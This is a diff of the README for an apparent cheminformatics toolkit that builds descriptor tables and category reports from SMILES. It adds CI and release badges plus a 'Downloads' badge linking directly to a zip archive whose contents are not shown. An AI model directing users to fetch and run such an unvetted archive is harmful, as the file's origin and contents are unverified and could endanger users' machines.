@@ -1,5 +1,9 @@
 # MolProp Toolkit
 
+[![CI](https://github.com/kelokely/-molprop-toolkit/actions/workflows/ci.yml/badge.svg)](https://github.com/kelokely/-molprop-toolkit/actions/workflows/ci.yml)
+[![Releases](https://img.shields.io/github/v/release/kelokely/-molprop-toolkit)](https://github.com/kelokely/-molprop-toolkit/releases)
+[![Downloads](https://img.shields.io/badge/download-latest-blue)](https://github.com/kelokely/-molprop-toolkit/releases/latest/download/molprop-toolkit_latest.zip)
+
 MolProp Toolkit is a small, practical repository for generating and analyzing cheminformatics property tables from SMILES and for producing category focused reports from those tables. The project is organized around two ideas. The first idea is to compute a wide descriptor table where the first columns are the ones medicinal chemists typically want to see first, such as CNS MPO, oral bioavailability filters, Rule of 5 and Rule of 3, med‑chem structural flags, toxicity alerts, and metabolic soft‑spot summaries. The second idea is to treat the resulting CSV as a dataset and provide multiple analyzers, one per category, so that you can quickly answer questions such as which compounds have PAINS flags, which compounds have high hERG risk, which compounds are predicted to be poorly soluble, or which compounds have too many metabolic soft spots.
 
 The analyzers are written to keep the compound identity visible in every output. Each analyzer automatically detects a compound identifier column, preferring `Compound_ID` when present, and will always print that name alongside the key metrics that the analysis is summarizing.
